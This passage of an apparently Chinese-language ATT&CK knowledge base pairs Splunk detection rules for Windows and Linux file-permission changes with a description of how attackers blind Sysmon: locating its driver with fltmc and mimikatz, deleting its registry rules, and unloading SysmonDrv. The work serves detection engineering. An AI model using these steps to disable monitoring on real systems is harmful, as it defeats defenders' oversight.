\u663e\u5f0f\u6dfb\u52a0\u5230\u6240\u6709\n\u5339\u914d\u6587\u4ef6\u3002\u8981\u6307\u5b9a\u7684\u7ea7\u522b\u4e3a\u4ee5\u4e0b\u7ea7\u522b\u4e4b\u4e00:\nL[ow]\nM[edium]\nH[igh]\n\u5b8c\u6574\u6027 ACE \u7684\u7ee7\u627f\u9009\u9879\u53ef\u4ee5\u4f18\u5148\u4e8e\u7ea7\u522b\uff0c\u4f46\u53ea\u5e94\u7528\u4e8e\n\u76ee\u5f55\u3002\n/inheritance:e|d|r\ne - \u542f\u7528\u7ee7\u627f\nd - \u7981\u7528\u7ee7\u627f\u5e76\u590d\u5236 ACE\nr - \u5220\u9664\u6240\u6709\u7ee7\u627f\u7684 ACE\n\u6ce8\u610f:\nSid \u53ef\u4ee5\u91c7\u7528\u6570\u5b57\u683c\u5f0f\u6216\u53cb\u597d\u7684\u540d\u79f0\u683c\u5f0f\u3002\u5982\u679c\u7ed9\u5b9a\u6570\u5b57\u683c\u5f0f\uff0c\n\u90a3\u4e48\u8bf7\u5728 SID \u7684\u5f00\u5934\u6dfb\u52a0\u4e00\u4e2a *\u3002&lt;/p&gt; &lt;p&gt; /T \u6307\u793a\u5728\u4ee5\u8be5\u540d\u79f0\u6307\u5b9a\u7684\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u5339\u914d\u6587\u4ef6/\u76ee\u5f55\u4e0a\n\u6267\u884c\u6b64\u64cd\u4f5c\u3002ICACLS \u4fdd\u7559 ACE \u9879\u7684\u89c4\u8303\u987a\u5e8f:\n\u663e\u5f0f\u62d2\u7edd\n\u663e\u5f0f\u6388\u4e88\n\u7ee7\u627f\u7684\u62d2\u7edd\n\u7ee7\u627f\u7684\u6388\u4e88\nperm \u662f\u6743\u9650\u63a9\u7801\uff0c\u53ef\u4ee5\u4e24\u79cd\u683c\u5f0f\u4e4b\u4e00\u6307\u5b9a:\n\u7b80\u5355\u6743\u9650\u5e8f\u5217:\nN - \u65e0\u8bbf\u95ee\u6743\u9650\nF - \u5b8c\u5168\u8bbf\u95ee\u6743\u9650\nM - \u4fee\u6539\u6743\u9650\nRX - \u8bfb\u53d6\u548c\u6267\u884c\u6743\u9650\nR - \u53ea\u8bfb\u6743\u9650\nW - \u53ea\u5199\u6743\u9650\nD - \u5220\u9664\u6743\u9650\n\u5728\u62ec\u53f7\u4e2d\u4ee5\u9017\u53f7\u5206\u9694\u7684\u7279\u5b9a\u6743\u9650\u5217\u8868:\nDE - \u5220\u9664\nRC - \u8bfb\u53d6\u63a7\u5236\nWDAC - \u5199\u5165 DAC\nWO - \u5199\u5165\u6240\u6709\u8005\nS - \u540c\u6b65\nAS - \u8bbf\u95ee\u7cfb\u7edf\u5b89\u5168\u6027\nMA - \u5141\u8bb8\u7684\u6700\u5927\u503c\nGR - \u4e00\u822c\u6027\u8bfb\u53d6\nGW - \u4e00\u822c\u6027\u5199\u5165\nGE - \u4e00\u822c\u6027\u6267\u884c\nGA - \u5168\u4e3a\u4e00\u822c\u6027\nRD - \u8bfb\u53d6\u6570\u636e/\u5217\u51fa\u76ee\u5f55\nWD - \u5199\u5165\u6570\u636e/\u6dfb\u52a0\u6587\u4ef6\nAD - \u9644\u52a0\u6570\u636e/\u6dfb\u52a0\u5b50\u76ee\u5f55\nREA - \u8bfb\u53d6\u6269\u5c55\u5c5e\u6027\nWEA - \u5199\u5165\u6269\u5c55\u5c5e\u6027\nX - \u6267\u884c/\u904d\u5386\nDC - \u5220\u9664\u5b50\u9879\nRA - \u8bfb\u53d6\u5c5e\u6027\nWA - \u5199\u5165\u5c5e\u6027\n\u7ee7\u627f\u6743\u9650\u53ef\u4ee5\u4f18\u5148\u4e8e\u6bcf\u79cd\u683c\u5f0f\uff0c\u4f46\u53ea\u5e94\u7528\u4e8e\n\u76ee\u5f55:\n(OI) - \u5bf9\u8c61\u7ee7\u627f\n(CI) - \u5bb9\u5668\u7ee7\u627f\n(IO) - \u4ec5\u7ee7\u627f\n(NP) - \u4e0d\u4f20\u64ad\u7ee7\u627f\n(I) - \u4ece\u7236\u5bb9\u5668\u7ee7\u627f\u7684\u6743\u9650\n\u793a\u4f8b:\nicacls c:\\windows\\* /save AclFile /T\n- \u5c06 c:\\windows \u53ca\u5176\u5b50\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6\u7684\nACL \u4fdd\u5b58\u5230 AclFile\u3002\nicacls c:\\windows\\ /restore AclFile\n- \u5c06\u8fd8\u539f c:\\windows \u53ca\u5176\u5b50\u76ee\u5f55\u4e0b\u5b58\u5728\u7684 AclFile \u5185\n\u6240\u6709\u6587\u4ef6\u7684 ACL\u3002\nicacls file /grant Administrator:(D,WDAC)\n- \u5c06\u6388\u4e88\u7528\u6237\u5bf9\u6587\u4ef6\u5220\u9664\u548c\u5199\u5165 DAC \u7684\u7ba1\u7406\u5458\u6743\u9650\u3002\nicacls file /grant *S-1-1-0:(D,WDAC)\n- \u5c06\u6388\u4e88\u7531 sid S-1-1-0 \u5b9a\u4e49\u7684\u7528\u6237\u5bf9\u6587\u4ef6\u5220\u9664\u548c\u5199\u5165 DAC \u7684\u6743\u9650\u3002\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u76d1\u89c6\u5e76\u8c03\u67e5\u4fee\u6539ACL\u548c\u6587\u4ef6\u6216\u76ee\u5f55\u6240\u6709\u6743\u7684\u5c1d\u8bd5\u3002\u8bb8\u591a\u7528\u4e8e\u4fee\u6539ACL\u548c\u6587\u4ef6/\u76ee\u5f55\u6240\u6709\u6743\u7684\u547d\u4ee4\u662f\u5185\u7f6e\u7684\u7cfb\u7edf\u5b9e\u7528\u7a0b\u5e8f\uff0c\u5e76\u4e14\u53ef\u80fd\u4f1a\u4ea7\u751f\u5f88\u9ad8\u7684\u8bef\u62a5\u7387\uff0c\u56e0\u6b64\uff0c\u8bf7\u4e0e\u57fa\u51c6\u77e5\u8bc6\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ee5\u4e86\u89e3\u901a\u5e38\u5982\u4f55\u4f7f\u7528\u7cfb\u7edf\u5e76\u5c06\u4fee\u6539\u4e8b\u4ef6\u4e0e\u5176\u4ed6\u6076\u610f\u6d3b\u52a8\u6307\u793a\u76f8\u5173\u8054\u5728\u53ef\u80fd\u7684\u60c5\u51b5\u3002</p> <p>\u8003\u8651\u5bf9\u5305\u542b\u5173\u952e\u4e8c\u8fdb\u5236\u6587\u4ef6/\u914d\u7f6e\u6587\u4ef6\u7684\u6587\u4ef6\u5939\u542f\u7528\u6587\u4ef6/\u76ee\u5f55\u6743\u9650\u66f4\u6539\u5ba1\u6838\u3002\u4f8b\u5982\uff0c\u4fee\u6539DACL\u65f6\u4f1a\u521b\u5efaWindows\u5b89\u5168\u65e5\u5fd7\u4e8b\u4ef6\uff08\u4e8b\u4ef6ID 4670\uff09</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#splunk","title":"splunk\u89c4\u5219","text":"<pre><code>index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image IN (\u201c*\\\\icacls.exe\u201d , \u201c*\\\\takeown.exe\u201d , \u201c*\\\\attrib.exe\u201d)) OR (EventCode=1 CommandLine=\u201d*/grant*\u201d) //File and Folder permission modification\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#_6","title":"\u5efa\u8bae","text":"<p>\u5982\u679c\u4f60\u5bf9windows\u6709\u8db3\u591f\u591a\u7684\u4e86\u89e3\uff0c\u90a3\u4e48\u76f8\u4fe1\u4f60\u4e5f\u77e5\u9053\u5e94\u8be5\u5982\u4f55\u53bb\u7528Windows\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\u6b64\u7c7b\u653b\u51fb\u884c\u4e3a\uff0c\u6bd4\u5982\u4f9d\u97604688\u4e2d\u7684\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1222-001</p> <p>https://attack.mitre.org/techniques/T1222/001/</p> <p>windows\u4e2d\u4f7f\u7528icacls\u547d\u4ee4\u8fd8\u539f\u6587\u4ef6\u5939\u7684\u6743\u9650\u8bbe\u7f6e</p> <p>https://www.jb51.net/os/windows/155450.html</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/","title":"T1222-002-linux-\u6587\u4ef6\u6743\u9650\u4fee\u6539","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u6587\u4ef6\u6743\u9650\u901a\u5e38\u6709\u6587\u4ef6\u7684\u6240\u6709\u8005\u6307\u5b9a\u7684\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\u5217\u8868(DACL)\u7ba1\u7406\u3002\u6587\u4ef6DACL\u5b9e\u73b0\u53ef\u80fd\u56e0\u4e0d\u540c\u7cfb\u7edf\u800c\u5f02\uff0c\u4f46\u901a\u5e38\u660e\u786e\u6307\u5b9a\u90a3\u4e9b\u7528\u6237/\u7ec4\u53ef\u4ee5\u6267\u884c\u90a3\u4e9b\u64cd\u4f5c\uff08\u4f8b\u5982\uff1a\u8bfb\u53d6\u3001\u5199\u5165\u3001\u6267\u884c\u7b49\uff09\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4fee\u6539\u6587\u4ef6\u6743\u9650/\u5c5e\u6027\u6765\u9003\u907f\u9884\u5b9a\u7684DACL\u7b56\u7565\uff0c\u4fee\u6539\u53ef\u80fd\u5305\u62ec\u66f4\u6539\u7279\u5b9a\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u8fd9\u53ef\u80fd\u9700\u8981\u83b7\u53d6\u6587\u4ef6\u7684\u6240\u6709\u6743\u6216\u63d0\u5347\u6743\u9650\uff0c\u4f8b\u5982\uff1aadminister/root\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u6587\u4ef6\u7684\u73b0\u6709\u6743\u9650\u3002\u7279\u5b9a\u6587\u4ef6\u4fee\u6539\u53ef\u80fd\u662f\u8bb8\u591a\u6280\u672f\u7684\u5fc5\u9700\u6b65\u9aa4\uff0c\u4f8b\u5982\u901a\u8fc7\u8f85\u52a9\u529f\u80fd\uff0c\u767b\u9646\u811a\u672c\u5efa\u7acb\u6301\u4e45\u6027\uff0c\u6216\u8005\u6c61\u67d3/\u52ab\u6301\u5176\u4ed6\u5de5\u5177\u7684\u914d\u7f6e\u6587\u4ef6\u7b49\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>chmod 766 abc.txt</p> <p>chmod  u+x abc.txt  #abc.txt\u6587\u4ef6\u5c5e\u4e3b\u6743\u9650\uff0c\u5177\u6709\u6267\u884c\u6743\u9650</p> <p>chmod  o-x abc.txt   #\u53d6\u6d88\u5176\u4ed6\u7528\u6237\u5bf9abc.txt\u7684\u6267\u884c\u6743\u9650</p> <p>chown runoob:runoobgroup abc.txt  \u5c06\u6587\u4ef6 abc.txt \u7684\u62e5\u6709\u8005\u8bbe\u4e3a runoob\uff0c\u7fa4\u4f53\u7684\u4f7f\u7528\u8005 runoobgroup</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09</p> <p>bash\u5386\u53f2\u8bb0\u5f55</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>icbc@icbc:~$ sudo chmod 766 abc.txt ...... icbc@icbc:~$ sudo chmod u+x abc.txt</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u57fa\u4e8eaudit\u65e5\u5fd7</p> <p>\u6682\u65e0</p> <p>\u57fa\u4e8e\u5386\u53f2\u8bb0\u5f55</p> <p>icbc@icbc:~$ histroy</p> <p>646  sudo chmod 766 abc.txt</p> <p>647  sudo chmod u+x abc.txt</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#splunk","title":"splunk\u89c4\u5219","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#audit","title":"\u57fa\u4e8eaudit\u65e5\u5fd7","text":"<p>index=linux sourcetype=linux_audit syscall=90 OR syscall=91 OR sycall=268 | table msg,syscall,syscall_name,success,auid,comm,exe</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#bash","title":"\u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55","text":"<p>index=linux sourcetype=\"bash_history\" bash_command=\"chmod \" OR bash_command=\"chown\" | table host,user_name,bash_command</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#_6","title":"\u5efa\u8bae","text":"<p>\u503c\u7684\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u767d\u540d\u5355\u8fdb\u884c\u6570\u636e\u964d\u566a\uff0c\u5426\u5219\u4f60\u53ef\u80fd\u4f1a\u5728\u65e0\u4f11\u6b62\u7684\u53bb\u8bef\u62a5\u7684\u8def\u4e0a\u8d8a\u8d70\u8d8a\u8fdc\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1222-002</p> <p>https://attack.mitre.org/techniques/T1222/002/</p> <p>Audit\u914d\u7f6e\u624b\u518c</p> <p>https://www.cnblogs.com/bldly1989/p/7204358.html</p> <p>DACL\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\u5217\u8868</p> <p>https://baike.baidu.com/item/DACL/10681774?fr=aladdin</p> <p>linux\u4e0bchmod\u547d\u4ee4\u7528\u6cd5</p> <p>https://blog.csdn.net/shinehoo/article/details/5821354</p> <p>linux\u4e0bchown\u547d\u4ee4\u7528\u6cd5</p> <p>https://www.runoob.com/linux/linux-comm-chown.html</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/","title":"T1562-001-windows-\u7ed5\u8fc7sysmon","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u7531\u76d1\u6d4b\u8f6f\u4ef6\u6216\u8fdb\u7a0b\u6355\u83b7\u5230\u7684\u544a\u8b66\uff0c\u4ee5\u53ca\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u6ce8\u518c\u8868\u9879\u4e2d\u7684\u76d1\u6d4b\u8f6f\u4ef6\u7684\u8bbe\u7f6e\uff0c\u4ee5\u8fbe\u5230\u9003\u907f\u8ffd\u8e2a\u7684\u76ee\u7684\u3002</p> <p>\u5728\u57fa\u4e8e\u7279\u5f81\u76d1\u6d4b\u7684\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u963b\u6b62\u76d1\u6d4b\u7279\u5f81\u76f8\u5173\u7684\u6570\u636e\u88ab\u53d1\u9001\u51fa\u53bb\uff0c\u4ee5\u4fbf\u4e8e\u963b\u6b62\u5b89\u5168\u4eba\u5458\u8fdb\u884c\u5206\u6790\u3002\u8fd9\u53ef\u4ee5\u6709\u5f88\u591a\u65b9\u5f0f\u5b9e\u73b0\uff0c\u4f8b\u5982\u505c\u6b62\u8d1f\u8d23\u8f6c\u53d1\u7684\u8fdb\u7a0b\uff08splunk\u8f6c\u53d1\u5668\u3001Filebate\u3001rsyslog\u7b49\uff09\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4f17\u6240\u5468\u77e5\uff0csysmon\u53ef\u4ee5\u5e2e\u52a9\u5b89\u5168\u4eba\u5458\u8bb0\u5f55\u5f88\u591a\u5b89\u5168\u4e8b\u4ef6\uff0c\u76ee\u524dsysmon\u6700\u65b0\u7248\u672c\u5df2\u7ecf\u662f10.X\u7248\u672c\u3002\u5bf9\u4e8e\u653b\u51fb\u8005\u6765\u8bb2\uff0c\u4ed6\u4eec\u53ef\u80fd\u9700\u8981\u786e\u5b9a\u76ee\u6807\u4e3b\u673a\u662f\u5426\u5b58\u5728sysmon\u3002\u901a\u5e38\uff0c\u653b\u51fb\u8005\u662f\u4e0d\u4f1a\u53bb\u68c0\u6d4b\u4ed6\u4eec\u5165\u4fb5\u7684\u4e3b\u673a\u4e0a\u662f\u5426\u5b58\u5728sysmon\u3002</p> <p>\u5982\u4f55\u68c0\u6d4b\u88ab\u5165\u4fb5\u7684\u4e3b\u673a\u662f\u5426\u5b58\u5728sysmon\uff0c\u5f88\u591a\u653b\u51fb\u8005\u4e00\u822c\u6267\u884c\u4ee5\u4e0b\u7684\u4e00\u79cd\u64cd\u4f5c\uff1a</p> <p>\u679a\u4e3e\u8fdb\u7a0b\uff1b</p> <p>\u679a\u4e3e\u670d\u52a1\uff1b</p> <p>\u679a\u4e3eC:\\Windows\\System32\\Drivers\u4e0b\u7684\u9a71\u52a8\uff1b</p> <p>\u4f46\u662f\uff0c\u4f60\u5e94\u8be5\u77e5\u9053sysmon\u53ef\u4ee5\u5b9e\u73b0\u4ee5\u4e0b\u529f\u80fd\uff1a\u7528\u6237\u53ef\u4ee5\u5728\u5176\u4e2d\u66f4\u6539\u53ef\u6267\u884c\u6587\u4ef6\u548c\u9a71\u52a8\u6587\u4ef6\u7684\u540d\u79f0\uff0c\u4ee5\u4fbf\u5176\u5728\u7cfb\u7edf\u4e2d\u7684\u5b58\u5728\u8fdb\u884c\u6a21\u7cca\u5904\u7406\u3002</p> <p>\u4e0d\u8fc7\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528fltmc.exe\u67e5\u770b\u5176altitude\u53f7\u7801\uff0csysmon\u7684altitude\u53f7\u7801\u662f385201\uff0c\u56fa\u5b9a\u4e0d\u53d8\u7684\u3002</p> <p>\u4f7f\u7528fltmc.exe\u5f97\u5230\u7684altitude\u53f7\uff1a</p> <pre><code>Windows PowerShell\n\u7248\u6743\u6240\u6709 (C) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\nPS C:\\Users\\Administrator&gt; fltmc.exe\n\n\u7b5b\u9009\u5668\u540d\u79f0                      \u6570\u5b57\u5b9e\u4f8b       \u9ad8\u5ea6          \u6846\u67b6\n\n------\n\nSysmonDrv                               2       385201         0\nluafv                                   1       135000         0\n</code></pre> <p>\u5728Mimikatz\u4e2d\u4f7f\u7528misc::mflt\u547d\u4ee4\u5f97\u5230\u7684altitude\u53f7\uff1a</p> <pre><code>mimikatz # misc::mflt\n0 2     385201 SysmonDrv\n0 1     135000 luafv\n</code></pre> <p>\u5173\u4e8e\u66f4\u591a\u7684\u5982\u4f55\u68c0\u6d4b\u88ab\u5165\u4fb5\u7684\u4e3b\u673a\u662f\u5426\u5b58\u5728sysmon\uff0c\u4f60\u53ef\u4ee5\u53c2\u8003\uff1ahttps://anquan.baidu.com/article/350\uff0c\u5982\u4f55\u68c0\u6d4bsysmon\u4e0d\u662f\u672c\u6587\u7684\u91cd\u70b9.</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#sysmon","title":"\u7ed5\u8fc7Sysmon\u7684\u4e24\u79cd\u65b9\u6cd5","text":"<p>\u76ee\u524d\uff0c\u653b\u51fb\u8005\u67092\u4e2a\u7ed5\u8fc7sysmon\u7684\u65b9\u6cd5\uff0c\u7b2c\u4e00\u4e2a\u662f\u5728\u5229\u7528sysmon\u8fdb\u7a0b\u4e2d\u7684\u76f2\u70b9\uff0c\u7b2c\u4e8c\u79cd\u5219\u662f\u76f4\u63a5\u7981\u7528sysmon\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#_2","title":"\u5220\u9664\u914d\u7f6e\u9879","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u5220\u9664\u6ce8\u518c\u8868\u4e2d\u7684\u89c4\u5219\u9879\uff0c\u6b64\u65f6\uff0c Sysmon\u5728\u53d1\u73b0\u6ce8\u518c\u8868\u88ab\u66f4\u6539\u540e\uff0c\u5b83\u5c06\u81ea\u52a8\u91cd\u65b0\u52a0\u8f7d\u914d\u7f6e\u3002\u7531\u4e8e\u6b64\u65f6\u6ca1\u6709\u4efb\u4f55\u5b89\u5168\u68c0\u6d4b\u89c4\u5219\u5b58\u5728\uff0c\u5b83\u5c06\u6682\u65f6\u5931\u53bb\u9632\u62a4\u80fd\u529b\uff0c\u4e0d\u8fc7\u5931\u6548\u65f6\u95f4\uff0c\u53d6\u51b3\u4e8e\u914d\u7f6e\u7684\u7ef4\u62a4\u65b9\u5f0f\u3002\u5982\u679c\u914d\u7f6e\u7531Ansible\uff0cChef\u6216DSC\u7b49\u914d\u7f6e\u7ba1\u7406\u7cfb\u7edf\u7ba1\u7406\uff0c\u53ef\u80fd\u9700\u8981\u51e0\u79d2\u5230\u51e0\u5206\u949f\u624d\u80fd\u5c06\u914d\u7f6e\u66f4\u6539\u56de\u539f\u59cb\u72b6\u6001\uff0c\u5982\u679c\u4f7f\u7528GPO\u6765\u7ba1\u7406\uff0c\u90a3\u4e48\u5f53GPO\u66f4\u65b0\u65f6\uff0c\u53ef\u4ee5\u572890\u5206\u949f\u5185\u6062\u590d\u539f\u59cb\u72b6\u6001\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u5404\u79cdWindows\u6280\u672f\uff08\u5982.Net\u3001VBS\u3001PE\u6587\u4ef6\u7b49\uff09\u521b\u5efaVMI\u4e34\u65f6\u6027Consumer\u76d1\u63a7\u76f8\u5e94\u7684\u6ce8\u518c\u8868\u9879\uff0c\u5f53\u53d1\u73b0\u4fee\u6539\u64cd\u4f5c\u65f6\uff0c\u5219\u4f1a\u5220\u9664\u4fee\u6539\u6570\u636e\u6216\u8005\u91cd\u65b0\u8bbe\u7f6e\u8868\u9879\u5185\u5bb9\u3002\u4e4b\u6240\u4ee5\u4f7f\u7528\u4e34\u65f6\u7684Consumer\uff0c\u662f\u56e0\u4e3a\u5927\u591a\u6570\u9632\u62a4\u89e3\u51b3\u65b9\u6848\u4f1a\u91cd\u70b9\u5173\u6ce8\u6b63\u5728\u521b\u5efa\u6216\u4fee\u6539\u7684WMI\u6c38\u4e45\u4e8b\u4ef6\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#sysmondrv","title":"\u5378\u8f7dSysmonDrv\u9a71\u52a8","text":"<p>\u6211\u4eec\u53ef\u4ee5\u91c7\u53d6\u7684\u53e6\u4e00\u4e2a\u64cd\u4f5c\u5c31\u662f\u5378\u8f7dSysmonDrv\u9a71\u52a8\uff0c\u8be5\u9a71\u52a8\u53ef\u4ee5\u4e3aSysmon\u63d0\u4f9b\u5173\u4e8e\u6240\u6709\u78c1\u76d8\u64cd\u4f5c\u7684\u4fe1\u606f\uff0c\u7136\u540e\u5c06\u4fe1\u606f\u5199\u5165\u4e8b\u4ef6\u65e5\u5fd7\u4e2d\u3002\u5982\u524d\u6587\u6240\u8ff0\uff0c\u8be5\u9a71\u52a8\u6709\u4e2a\u552f\u4e00\u7684altitude\u7f16\u53f7\uff0c\u5982\u679c\u6211\u4eec\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884c\uff0c\u5c31\u53ef\u4ee5\u5378\u8f7d\u8be5\u9a71\u52a8\uff0c\u7136\u540eSysmon\u57fa\u672c\u4e0a\u5c31\u4f1a\u5b8c\u5168\u5904\u4e8e\u5931\u6548\u72b6\u6001\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528<code>fltmc.exe</code>\u5de5\u5177\u6765\u5378\u8f7d\u9a71\u52a8\uff0c\u5982\u4e0b\u6240\u793a\uff0c\u6211\u4eec\u901a\u8fc7altitudde\u7f16\u53f7\u8bc6\u522b\u51fa\u4e86\u9690\u85cf\u9a71\u52a8\uff0c\u5e76\u6210\u529f\u5378\u8f7d\u8be5\u9a71\u52a8\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#sysmon_1","title":"\u5173\u95edsysmon\u670d\u52a1\uff08\u7ba1\u7406\u5458\u6743\u9650\uff09","text":"<p>\u901a\u8fc7windows\u4efb\u52a1\u7ba1\u7406\u5668\uff0c\u7ba1\u7406\u5458\u6743\u9650\u5173\u95edsysmon\u670d\u52a1\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#_3","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>sysmon\u65e5\u5fd7\u3001Windows-WMI-Activity\u65e5\u5fd7\uff0csystem\u65e5\u5fd7</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#_4","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562